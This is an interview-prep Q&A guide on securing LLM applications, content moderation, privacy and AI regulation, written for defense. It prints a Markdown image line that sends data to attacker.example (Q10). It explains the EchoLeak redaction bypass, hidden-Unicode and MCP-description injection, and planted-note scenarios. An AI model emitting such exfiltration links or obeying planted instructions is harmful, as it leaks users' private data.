# AI Security, Privacy, and Responsible Use Interview Questions and Answers

These questions review AI security fundamentals, prompt injection,
guardrails and moderation, privacy and data retention, and AI regulation
and governance. Try answering each one before reading the answer. Facts
about providers and laws are as of November 2026.

## Fundamentals

### 1. How does securing an AI feature differ from securing an ordinary web feature?

All the usual controls still apply: authentication, authorization on
every resource, input validation, secrets management, and careful
logging. AI features add a component that follows instructions found
anywhere in its input, new untrusted inputs (retrieved documents, tool
results), untrusted outputs that may be rendered or executed, and new
data flows to providers, vector stores, and traces. The model belongs on
the untrusted side of the boundary.

### 2. What is the trust boundary in an LLM application?

The backend is trusted; the model, user text, retrieved content, and
model output are not. The backend decides what data the model may see
(only what the signed-in user may see), which tools exist, and whether
each tool call is allowed. The model can suggest; code decides. A system
must stay safe even if the model follows hostile content.

### 3. What changed in the OWASP Top 10 for LLM Applications for 2026?

Prompt injection stays LLM01. Excessive Agency rose to third place,
Unbounded Consumption rose four places, and System Prompt Leakage was
generalized into Hidden Context Exposure (LLM08). The 2026 list was
published in August 2026; the 2025 list (November 2024) is still widely
cited, so check which numbering a tool uses.

### 4. Why must model output be treated as untrusted input?

Output can carry HTML or script, SQL fragments, shell commands, file
paths, or URLs, either by accident or because an injection asked for
them. OWASP calls this Improper Output Handling. Encode output for its
context, validate structured output against a schema, parameterize
queries, never execute generated code automatically, and filter images
and links before rendering.

### 5. What is overreliance, and how do you design against it?

Users act on wrong but confident answers (OWASP's Misinformation entry).
Show sources the application verified, make uncertainty visible, keep
AI output as drafts where errors are costly, and require human review
for consequential actions. Evaluate factual accuracy before launch and
monitor it after.

### 6. How do you threat-model the data path of an AI feature?

Follow the data from the browser to the API, retrieval store, model
provider, tools, logs, traces, caches, and the rendered result. For each
hop ask who can write content into it (an injection source), who can
read it (an exposure risk), how long it is kept, and how it is deleted.

## Prompt injection and defenses

### 7. What is prompt injection, and why can't it be fixed like SQL injection?

Prompt injection is text the model reads that changes its behavior
against the application's intent. SQL injection was solved by
parameterized queries, which separate code from data. Models have no
such separation: as the UK NCSC puts it, they "do not enforce a security
boundary between instructions and data inside a prompt". Defenses must
therefore limit what a successful injection can do.

### 8. What is the difference between direct and indirect injection?

Direct injection comes from the user typing to the assistant; it mostly
harms the operator (policy bypass, leaked prompts, cost). Indirect
injection is planted by a third party in content the app later feeds to
the model, such as a shared note, an email, a web page, or a tool
result; it harms the user, whose data leaks or whose actions are taken.

### 9. How does jailbreaking relate to prompt injection?

OWASP describes jailbreaking as the subset of prompt injection whose goal
is to make the model violate its safety protocols. Getting disallowed
content out is a moderation problem; hijacking the application's goals
or tools is the security problem.

### 10. How can a Markdown image leak data without a click?

If the model outputs `![x](https://attacker.example/p.png?d=DATA)` and the
UI renders Markdown, the browser fetches the URL immediately, sending
whatever the injection put in the query string or hostname. Remove
images from unknown hosts before rendering and back the filter with a
CSP `img-src` allowlist.

### 11. Why did reference-style Markdown matter in the EchoLeak attack?

EchoLeak (CVE-2025-32711, Microsoft 365 Copilot) used reference-style
links and images, `![x][1]` with `[1]: https://...` elsewhere, to get
past redaction that only looked for the inline form, and used an
auto-fetched image routed through a domain the CSP allowed. Filters
must handle every Markdown form, and CSP allowlists must not include
hosts that fetch arbitrary URLs.

### 12. What is the lethal trifecta?

Simon Willison's name for the combination that makes data theft
possible: access to private data, exposure to untrusted content, and a
way to communicate externally. Remove any one leg and exfiltration is
not possible, whatever the model is persuaded to do. Rendering an image
or link counts as external communication.

### 13. What is the Rule of Two, and how do you enforce it in code?

Meta's guideline: an agent session should hold at most two of untrusted
input, sensitive data or systems, and the ability to change state or
communicate externally; with all three, a person approves. Track the
capabilities a session has gained and check before each tool call:

```ts
const after = new Set([...session.capabilities, ...tool.adds]);
if (after.size === 3) return { kind: "confirm", reason: "untrusted input, private data, and an external action" };
```

### 14. Explain the Dual LLM pattern. What can an injection still change?

A privileged model plans and calls tools but never sees untrusted text.
A quarantined model reads the untrusted text, has no tools, and returns
a value stored in a variable by plain controller code, which inserts it
where the plan says. An injection in a note can still distort that value
(a wrong summary) but cannot change the plan, the tools, or the
recipient.

### 15. What is Plan-Then-Execute, and when does it not fit?

The model commits to a sequence of actions before reading any untrusted
data, so injected text cannot add steps. It fits tasks whose steps are
known up front, such as "email me this week's summary". It fits poorly
when the next step genuinely depends on what the content says, such as
open-ended research; those need confirmation or a narrower design.

### 16. What is spotlighting, and what are its limits?

Marking untrusted text so the model can tell it apart from instructions:
delimiting, datamarking (joining words with a marker such as `^`), or
encoding. Microsoft's research cut attack success from over 50% to under
2% in its experiments, but OWASP notes it helps "in non-adaptive tests
only": an attacker who knows the scheme can imitate it.

### 17. Why strip invisible Unicode characters, and which ones?

Tag characters (U+E0000 to U+E007F), variation selectors (U+FE00 to
U+FE0F), and zero-width characters (U+200B, U+200C, U+200D, U+2060) are
invisible to people but readable by models. They can hide instructions
in harmless-looking text or smuggle data out inside links, and they can
make a confirmation dialog show something different from the real
action.

### 18. How should you use prompt-injection classifiers?

As signals for blocking obvious attacks, logging, and alerting, never as
the boundary. If each variant is caught independently with probability
`p` and an attacker tries `n` variants, at least one gets through with
probability `1 - p^n`: at 95% and 20 tries that is 64%. Also check what a
detector inspects; Bedrock's prompt attack filter does not evaluate tool
results, and Azure's document-attack detection is off by default in
Foundry guardrails.

### 19. What makes a human confirmation a real security control?

The pending action is stored on the server with its exact arguments,
user, and expiry; the UI shows the exact rendered action, not a summary;
approval comes from a UI control that calls the API, never from chat
text; it works once, for the same user, before expiry; and authorization
is re-checked at execution. Confirm only consequential actions, or users
stop reading.

### 20. Why add a CSP `img-src` allowlist if you already filter Markdown?

Filters are regular expressions or renderer hooks, and Markdown has many
syntaxes; a missed form is likely sooner or later. The browser enforces
CSP for every image load, so an image the filter missed is still not
fetched, and `report-to` sends a violation report that tells you the
filter has a gap.

### 21. How do you test prompt-injection defenses?

Unit-test the deterministic layers (filters, gates, confirmation store).
Keep adversarial evaluation cases that plant payloads in notes, emails,
and documents and assert that a canary value never appears in URLs,
links, or tool arguments, and run them in CI. Use red-team tools such as
garak, promptfoo, or PyRIT, and test against adaptive attackers who know
the defense: adaptive attacks defeated most of 12 published defenses in
a 2025 study.

### 22. Why are MCP tool descriptions an injection risk?

Tool names, descriptions, and schemas are text the model reads when it
decides what to call. A malicious or compromised server can put
instructions there, and a pinned version does not help if the
description changes without a version bump. Review and pin servers,
audit descriptions, and give each feature only the tools it needs.

## Guardrails and content moderation

### 23. What is a guardrail, and where can it run?

A check before or after a model call that can allow, change, or stop
content. NeMo Guardrails names five places: input rails, dialog rails,
retrieval rails (on retrieved chunks), execution rails (on tool inputs
and outputs), and output rails. Most apps need cheap deterministic
checks, input classifiers, and output checks.

### 24. How is content moderation different from prompt-injection defense?

Moderation classifies content against harm categories such as
harassment, hate, sexual content, violence, and self-harm. It does not
detect an attack on your application's goals or stop data exfiltration.
A polite, harmless-looking injection passes moderation easily.

### 25. What does the OpenAI moderation endpoint return, and how should you use it?

For each input it returns `flagged`, per-category booleans in
`categories`, confidence scores in `category_scores`, and which input
types each score applies to. OpenAI advises treating scores "as signals
for your application's policy, not as an automatic blocking decision",
and warns that thresholds may need recalibration as the model is
upgraded. Map scores through your own policy.

### 26. Compare the main kinds of moderation checks.

Rules and blocklists are fast but brittle. Hosted moderation APIs give
calibrated scores but a fixed taxonomy. Configurable services (Bedrock
Guardrails, Foundry guardrails, Model Armor) add denied topics, PII
masking, and grounding checks. Open-weight classifiers (Llama Guard 4,
ShieldGemma, Granite Guardian) run in your network. Policy-reasoning
models such as gpt-oss-safeguard apply your written policy but are
slower and costlier per call.

### 27. What belongs in a content policy?

For each category: what counts as a violation in this product, boundary
examples, the surfaces it applies to (input, output, shared comments),
the action, and who reviews. Keep it as versioned data and record the
policy version with every decision. A workplace tool's policy differs
from a fiction app's.

### 28. Why give a supportive reply to self-harm intent instead of blocking?

A person who discloses intent to self-harm needs help, not an error
message. The policy maps self-harm intent to a fixed, reviewed message
with support resources chosen by locale, while self-harm instructions in
model output are blocked.

### 29. Why do false positives dominate when violations are rare?

Because of the base rate. With 50 violations in 10,000 comments, 96%
recall, and a 1% false-positive rate on benign text:

```text
true positives  = 0.96 x 50    = 48
false positives = 0.01 x 9,950 = about 100
precision       = 48 / 148     = 0.32
```

Two of three flags are wrong although the classifier is "99% accurate"
on benign text.

### 30. How do you choose a moderation threshold?

Collect labeled examples per category (from review queues and red-team
cases), sweep thresholds, and compute precision, recall, and flag rate.
Pick the highest threshold that meets the recall target the policy sets
for that category, which keeps false positives and review workload
lowest. Repeat per language.

### 31. Why can a threshold that worked last quarter start over-blocking?

The provider upgraded the classifier behind an alias and score
distributions shifted, your traffic changed (a new industry or
language), or attackers adapted. Pin model snapshots where offered,
alert on shifts in score percentiles, and re-run the sweep on the
labeled set.

### 32. How do you keep moderation from adding latency?

Run the input check in parallel with the model call and abort the model
if the input is flagged; buffer streamed output into sentences and check
each before showing it; cache verdicts by a hash of the normalized text
and the policy version; and run cheap deterministic checks first.

### 33. What do fail open and fail closed mean for a guardrail?

When a check times out or errors, fail closed blocks or holds the
content; fail open continues and logs. Fail closed where a miss is
costly (public comments, content for children), fail open where
availability matters more and the harm of a miss is low. Make the
choice explicit per feature.

### 34. Why set `maxRetries: 0` on a moderation call made inside a guard?

The guard owns the deadline. SDK retries with backoff would stretch a
1.5-second budget into several seconds without anyone noticing, and the
timeout decision (open or closed) would no longer reflect the policy.

### 35. Which guardrail libraries are maintained, as of November 2026?

NVIDIA NeMo Guardrails (version 0.24.1, repository moved to the
`NVIDIA-NeMo` organization) and Guardrails AI (version 0.11.0) are
active. LLM Guard was archived on July 9, 2026 and is read-only, so new
projects should not start on it. In TypeScript, AI SDK middleware
(`wrapLanguageModel`) can wrap checks around any provider's model.

### 36. What are Gemini's default safety settings on current models?

Google's documentation says the default threshold for the adjustable
categories is "Off for Gemini 2.5 and later models", while core harms
such as child safety are always blocked and cannot be adjusted. Teams
that assumed filters were on need their own moderation.

## Privacy, PII, and data retention

### 37. Where do copies of one AI request end up?

At the provider: abuse-monitoring logs, stored state (responses, files,
vector stores, conversations), and prompt caches. In your systems: app
logs, traces, answer caches, vector store chunks, and evaluation and
feedback sets. Each needs an owner, a lifetime, and a deletion path.

### 38. What is the difference between minimization, masking, and pseudonymization?

Minimization sends only the fields a feature needs. Masking replaces a
value with a type marker such as `[EMAIL]`. Pseudonymization replaces it
with a numbered placeholder such as `[EMAIL_1]` that your server can map
back, so the model can tell people apart and the output can be restored
for allowed types.

### 39. How does a redactor avoid false positives on card numbers and IBANs?

By validating checksums before replacing: card numbers carry a Luhn
check digit and IBANs a mod-97 checksum. A 16-digit invoice number that
fails Luhn stays as it is. Detector order matters too: secrets and
emails run before patterns that could match parts of them.

### 40. Why does the redactor neutralize text that looks like a placeholder?

If a user types `[EMAIL_1]`, a naive `restore` would swap in the real
value. Rewriting such text to `(EMAIL_1)` before redaction means only
placeholders the redactor created can be restored.

### 41. Is pseudonymized data still personal data under the GDPR?

Yes. Recital 26 treats pseudonymized data as personal data while someone
holds the additional information that maps it back. Pseudonymization
keeps placeholders out of the provider, logs, and traces, but it does
not take the feature out of scope.

### 42. What does OpenAI keep for API calls by default?

API data is not used for training unless you opt in. Abuse-monitoring
logs are kept for up to 30 days. Responses API outputs are stored for at
least 30 days unless `store: false`, and files, vector stores, and
conversations are kept until you delete them. Zero Data Retention and
Modified Abuse Monitoring need prior approval.

### 43. What does zero data retention not cover?

Stateful features (files, vector stores, batches, conversations, code
execution containers) keep data until deleted; content flagged for
abuse can be kept longer (Anthropic says up to two years); some models
are excluded (Anthropic lists models that require 30-day retention, and
Bedrock models that require `aws_review` are unavailable in `none`
mode); and caches may hold data briefly.

### 44. How do the Gemini API's unpaid and paid tiers differ on data use?

Under the Gemini API terms, unpaid services may use content to improve
products and human reviewers may read it, so they are not for personal
or confidential data. Paid services do not use prompts or responses to
improve products, but log them for a limited period for abuse
detection. Apps for users in the EEA, Switzerland, or the UK must use
paid services.

### 45. How do you keep prompts out of logs and traces?

Log metadata (request id, feature, model, tokens, latency, guardrail
decision, provider response id, a keyed-hash user pseudonym), not text.
Under the OpenTelemetry GenAI conventions, content capture is opt-in;
set it off explicitly:

```bash
OTEL_INSTRUMENTATION_GENAI_CAPTURE_CONTENT=NO_CONTENT
```

For debugging, use a separate, access-controlled, short-lived content
store referenced from traces.

### 46. How do you erase one user's AI data?

Run an idempotent job: delete source data, then derived data (vector
chunks by source id, cached answers, evaluation and feedback rows), then
provider objects through the API using an index recorded at creation
time (treat 404 as done, retry failures), and let TTL copies expire.
Backups need deletions re-applied on restore, and fine-tuned weights
cannot forget one person, so keep personal data out of training sets.

### 47. What does data residency involve beyond choosing a provider region?

Separating storage from processing: OpenAI offers ten storage regions
but in-region processing only in some, chosen per project with a
regional base URL; Azure's deployment type (standard, DataZone, Global)
decides where processing happens; Bedrock's cross-region inference
moves it. Your own vector store, logs, and backups must be in the right
region too.

## Regulation and governance

### 48. What is the difference between a provider and a deployer under the EU AI Act?

A provider develops an AI system or model and places it on the market
under its own name; a deployer uses an AI system under its authority in
a professional activity. TaskFlow is a provider of the Assistant, built
on a general-purpose model from another provider; companies that roll
the Assistant out to staff are deployers.

### 49. What are the AI Act's risk tiers? Give a TaskFlow example of each.

Prohibited (Article 5): inferring workers' emotions from meeting notes.
High-risk (Article 6, Annexes I and III): suggesting who gets a task
from past performance (Annex III point 4(b)). Transparency (Article 50):
the Assistant chat must say it is an AI. Minimal: a spam filter for
comments. General-purpose AI models have a separate track.

### 50. What did the 2026 Digital Omnibus on AI change?

It entered into force on July 27, 2026. It moved the Annex III high-risk
obligations, due on August 2, 2026, to December 2, 2027, and set August
2, 2028 for AI in regulated products (Annex I). It added bans on non-consensual
intimate imagery and CSAM from December 2, 2026, and softened the AI
literacy duty to "take measures to support" staff literacy. The Article 50
transparency duties still apply from August 2, 2026, except that
generative systems already on the market have until December 2, 2026 to
mark their output.

### 51. What does Article 50 require of a chat assistant?

People must be "informed that they are interacting with an AI system",
clearly and at the latest at the first interaction, unless it is obvious.
Providers of systems that generate synthetic content must also mark it
in a machine-readable, detectable way, with exceptions for assistive
editing. Carry an AI flag in API responses so every client shows the
label.

### 52. What is the maximum AI Act fine for a prohibited practice?

EUR 35 million or 7% of worldwide annual turnover, whichever is higher.
For a company with EUR 2 billion turnover, 7% is EUR 140 million, so the
cap is EUR 140 million. For an SME the lower figure applies: with EUR 10
million turnover, 7% is EUR 0.7 million.

### 53. How do the NIST AI RMF and ISO/IEC 42001 differ?

The NIST AI RMF is a voluntary framework organized into Govern, Map,
Measure, and Manage, with a Generative AI Profile (NIST AI 600-1); NIST
says it is being revised. ISO/IEC 42001:2023 specifies requirements for
an AI management system that organizations can be certified against,
which enterprise customers may ask for.

### 54. What is a system card, and which fields matter most?

A short, structured document per AI feature: purpose, intended users,
uses it must not be put to, risk tier, model configuration key, data
and retention, evaluation evidence, human oversight, limitations, and an
incident contact. The "not intended for" list and dated evaluation
evidence matter most; keep cards as data and check them in CI.

### 55. Which US state laws discussed here matter to an app like TaskFlow?

Colorado's SB26-189 (signed May 14, 2026) replaced the 2024 Colorado AI
Act with rules for automated decision-making used in consequential
decisions such as employment, with duties phasing in from January 1,
2027; it may apply if features influence employment decisions about
Colorado residents. California's SB 53 targets frontier model
developers, not application builders.

## Scenario-based questions

### 56. Meeting summaries in one workspace suddenly contain "[image removed]". What do you do?

**What to check first:** the output filter's `image_removed` findings by
workspace, and the note ids cited in the affected summaries.

**How to confirm:** open the traces for those requests and look for the
same note in the retrieved context; scan it for injection signals and
invisible characters.

**Likely causes and fixes:** a planted note asking the model to add an
image whose URL carries data. Quarantine the note, notify the workspace
owner, search for the payload elsewhere, and add it to the adversarial
test set. See [prompt injection and defenses](prompt-injection-and-defenses.md).

### 57. CSP violation reports for `img-src` spike on the Assistant page. What is going on?

**What to check first:** the `blockedURL` hosts in the reports and the
model outputs at those times.

**How to confirm:** replay the logged outputs through the Markdown
filter and the renderer, and compare what each treats as an image.

**Likely causes and fixes:** an exfiltration attempt using a Markdown
form the filter misses. The CSP blocked it; extend the filter and its
tests, and keep the allowlist tight. See
[prompt injection and defenses](prompt-injection-and-defenses.md).

### 58. The task agent proposes sharing a project with an outside address right after reading notes. What do you do?

**What to check first:** the tool-call trace, the notes read before the
proposal, and the session's capability set.

**How to confirm:** look for instructions in the retrieved notes, and
check that the Rule of Two gate turned the call into a pending
confirmation rather than running it.

**Likely causes and fixes:** indirect injection through a shared note.
Keep the confirmation, remove tools the feature does not need, and move
the flow to plan-then-execute or a Dual LLM design. See
[prompt injection and defenses](prompt-injection-and-defenses.md).

### 59. The injection classifier keeps blocking a security team's notes. How do you fix it?

**What to check first:** the block rate per workspace and the appeal
outcomes.

**How to confirm:** label a sample of blocked notes; if most discuss
attacks rather than contain them, they are false positives.

**Likely causes and fixes:** a detector threshold tuned on generic data
applied to content about prompts. Log and review instead of blocking for
low-risk features, tune on your own labels, and keep the architectural
controls as the boundary. See
[guardrails and content moderation](guardrails-and-content-moderation.md).

### 60. The moderation block rate doubles overnight with no deploy. What do you check?

**What to check first:** score percentiles per category over time, and
the moderation model reported in responses.

**How to confirm:** re-score a fixed labeled set and compare with last
month's results.

**Likely causes and fixes:** the provider upgraded the model behind an
alias. Pin a snapshot where offered, re-run the threshold sweep, and
alert on distribution shifts. See
[guardrails and content moderation](guardrails-and-content-moderation.md).

### 61. Assistant p95 latency grows by a second. Traces show the output moderation span waiting. What now?

**What to check first:** the moderation span durations, error codes, and
retry counts.

**How to confirm:** check whether spans end at the guard's deadline and
whether SDK retries happen inside the deadline.

**Likely causes and fixes:** a slow moderation region amplified by
retries. Set `maxRetries: 0` inside the guard, keep a tight deadline,
choose fail open or closed per feature, and cache verdicts. See
[guardrails and content moderation](guardrails-and-content-moderation.md).

### 62. Users report seeing harmful text appear and then disappear. Why?

**What to check first:** whether the endpoint streams tokens to the
browser before the output check runs.

**How to confirm:** reproduce with a known-flagged prompt and record the
stream.

**Likely causes and fixes:** retracting content after streaming it.
Buffer output into sentences and release each one only after it passes
the check. See
[guardrails and content moderation](guardrails-and-content-moderation.md).

### 63. A customer's security review finds full prompts in your log platform. What do you do?

**What to check first:** which service and log line write them, and
whether tracing content capture is on in any environment.

**How to confirm:** search logs for a known test email, and inspect the
`OTEL_INSTRUMENTATION_GENAI_CAPTURE_CONTENT` value per environment.

**Likely causes and fixes:** a debug log in the AI client wrapper or
content capture enabled by a copied configuration. Remove it, set
`NO_CONTENT` explicitly, purge affected indexes, and add a CI check. See
[privacy, PII, and data retention](privacy-pii-and-data-retention.md).

### 64. A user was erased, but project Q&A still cites one of their notes. What went wrong?

**What to check first:** the vector store for chunks with the deleted
note's source id, and the answer cache.

**How to confirm:** query the vector index directly by source id and
check cache keys for the user.

**Likely causes and fixes:** the erasure job deleted the note but not its
derived copies. Delete chunks by source id and cache entries by user in
the job, and add a test that searches for erased content. See
[privacy, PII, and data retention](privacy-pii-and-data-retention.md).

### 65. A user pasted an API key into a meeting note that was summarized. What do you do?

**What to check first:** whether the redactor's `SECRET` count was
non-zero for that request, and which provider calls included the note.

**How to confirm:** check the provider response ids in your logs and
whether the key pattern was replaced before sending.

**Likely causes and fixes:** treat the key as leaked: revoke and rotate
it at once. Keep secret patterns in the redactor in front of every model
call and warn users when a note contains a credential. See
[privacy, PII, and data retention](privacy-pii-and-data-retention.md).

### 66. After switching to zero data retention, file uploads and stored conversations fail. Why?

**What to check first:** which endpoints fail, and the provider's
eligibility table for zero retention.

**How to confirm:** check whether the failing calls use stateful
features or `store: true`.

**Likely causes and fixes:** stateful features are not covered by zero
retention (on Bedrock, `store=true` is rejected in `none` mode). Keep
state in your own database, pass context explicitly, and set
`store: false`. See
[privacy, PII, and data retention](privacy-pii-and-data-retention.md).

### 67. Users see placeholders such as "[EMAIL_2]" in summaries. How do you fix it?

**What to check first:** whether the restore step used the same vault as
the redaction, and which types were allowed.

**How to confirm:** log placeholder counts per request and compare the
placeholders in the model output with the vault's keys.

**Likely causes and fixes:** a new vault per note, or the model altering
or inventing placeholders. Use one vault per request, instruct the model
to copy placeholders exactly, and render unknown placeholders as
"(hidden)". See
[privacy, PII, and data retention](privacy-pii-and-data-retention.md).

### 68. The weekly governance job fails on a new "workload insights" card. What does it mean?

**What to check first:** the checker's messages: risk tier, missing
fields, and evidence age.

**How to confirm:** read the card's purpose; suggesting who gets a task
from past performance matches Annex III point 4(b).

**Likely causes and fixes:** a high-risk feature heading for launch
without oversight, limitations, or fresh evaluations. Stop the launch,
get legal review, and either plan for the high-risk regime or redesign
the feature. See [AI regulation and governance](ai-regulation-and-governance.md).

### 69. A customer exports workload suggestions into performance reviews. Why is that a problem?

**What to check first:** the feature's system card and its "not
intended for" list, and how the export is used.

**How to confirm:** review support requests and usage analytics for the
export path.

**Likely causes and fixes:** the feature drifted into evaluating
workers, a high-risk use in the EU and a consequential decision under
Colorado's law. Re-classify, restrict the export, update terms and the
card, and get legal advice. See
[AI regulation and governance](ai-regulation-and-governance.md).

## Further learning

- [AI security, privacy, and responsible use overview](../security-privacy-and-responsible-ai.md)
- [Prompt injection and defenses](prompt-injection-and-defenses.md) ·
  [Guardrails and content moderation](guardrails-and-content-moderation.md) ·
  [Privacy, PII, and data retention](privacy-pii-and-data-retention.md) ·
  [AI regulation and governance](ai-regulation-and-governance.md)
- [OWASP Top 10 for LLM Applications 2026](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/)
- [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework)
- [European Commission: AI Act](https://digital-strategy.ec.europa.eu/en/policies/regulatory-framework-ai)
